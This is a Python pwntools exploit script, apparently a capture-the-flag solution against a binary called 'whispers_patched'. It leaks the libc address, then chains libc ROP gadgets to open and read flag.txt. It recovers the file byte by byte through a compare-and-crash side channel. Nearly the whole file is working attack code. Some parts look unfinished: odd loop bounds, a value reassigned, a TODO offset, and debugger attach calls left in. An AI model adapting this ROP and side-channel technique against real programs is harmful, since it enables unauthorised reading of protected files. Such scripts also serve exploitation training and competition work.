from pwn import *
import time

context.terminal = ["urxvt", "-e", "sh", "-c"]

buf = ""
for i in range(30, 0x24): # Which character we are testing
	if i == 10:
		buf += "?"
		continue
	j = 32
	j = 119
	while j < 0x80: # Which byte we are guessing the character to be
		target = process("./whispers_patched")
		exe = ELF("./whispers_patched")
		#target = remote("127.0.0.1", 9999)
		libc = ELF("./libc.so.6")

		gdb.attach(target, gdbscript='''
		''')

		leak = int(target.recv()[139:-1], base = 16) - libc.symbols["printf"]

		print(hex(leak))
		print("Iteration {},byte {}".format(i, j))
		libc.address = leak

		if (libc.address % 0x1000 != 0):
			target.close()
			continue


		p_rdi = libc.address + 0x2a3e5
		p_rsi = libc.address + 0x2be51
		p_rdx = libc.address + 0x796a2
		p_rax = libc.address + 0x45eb0
		syscall = libc.address + 0x91316
		write_rax = libc.address + 0x10587e # mov qword ptr [rax], rdi ; mov rax, r8 ; ret


		# TODO fix
		writable_libc = libc.address + 0x21b000 # may need to updat4

		cmp_rsi = libc.address + 0xf6f8a # cmp byte ptr [rsi], cl ; je 0xf6eed ; ret


		#/ consider:  0x0000000000191659 : cmp byte ptr [rcx], al ; sbb rax, -1 ; ret
		p_rcx_rbx = libc.address + 0x108b04 # pop rcx ; pop rbx ; ret



		cmp_rdi = libc.address + 0x163c1a # adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 
		je_die = libc.address + 0x7638c

		# This is the stub
		payload = p64(0)*9

		payload += p64(p_rdi) 
		payload += b"flag.txt"

		payload += p64(p_rax)
		payload += p64(writable_libc)
		payload += p64(write_rax)

		payload += p64(p_rdi) 
		payload += p64(writable_libc) # rdi now points to an address with 'flag.txt'


		payload += p64(p_rsi) # O_RDONLY
		payload += p64(0)

		payload += p64(p_rax)
		payload += p64(2)
		payload += p64(syscall) # open flag.txt

		payload += p64(p_rdi)
		payload += p64(3)

		payload += p64(p_rsi) # get writeable loc to rsi
		payload += p64(writable_libc)

		payload += p64(p_rdx)
		payload += p64(0x40)

		payload += p64(p_rax)
		payload += p64(0)
		payload += p64(syscall) # read flag


		payload += p64(p_rsi)
		payload += p64(writable_libc + i) # byte we inspectin

		payload += p64(p_rcx_rbx)
		payload += p64(j) # char we are matching currently
		payload += p64(0) # pad

		payload += p64(cmp_rsi)


		payload += p64(p_rdi)
		payload += p64(0)
		payload += p64(p_rsi)
		payload += p64(writable_libc)
		payload += p64(p_rdx)
		payload += p64(0x100)
		payload += p64(p_rax)
		payload += p64(0)
		payload += p64(syscall)


		if b"\x0a" in payload:
			print("INVALID PAYLOAD")
			continue

		target.sendline(payload)
		target.interactive()

		try:
			target.recv(timeout=0.1)
		except EOFError:
			print("Char {} has value {}".format(i, j))
			buf += chr(j)
			print(buf)
			target.close()
			break



		target.close()
		j += 1


print(buf)
